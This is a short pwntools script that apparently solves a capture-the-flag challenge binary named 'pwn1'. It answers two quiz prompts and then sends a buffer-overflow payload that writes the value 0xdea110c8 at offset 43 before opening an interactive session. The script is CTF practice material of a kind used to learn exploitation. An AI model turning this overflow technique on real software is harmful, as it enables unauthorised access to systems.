from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b *main+313
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pwn1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-l", "80%", "-t", ":.1"]

io = start()
# io.sendline(b"A"*30)
# io.sendline(flat({20:0xcaf3baee}))
io.sendafter("?", "Sir Lancelot of Camelot\n")
io.sendafter("?", "To seek the Holy Grail.\n")
# io.sendafter("?", cyclic(100)+b"\n")
io.sendafter("?", flat({43: 0xdea110c8})+b"\n")
io.interactive()
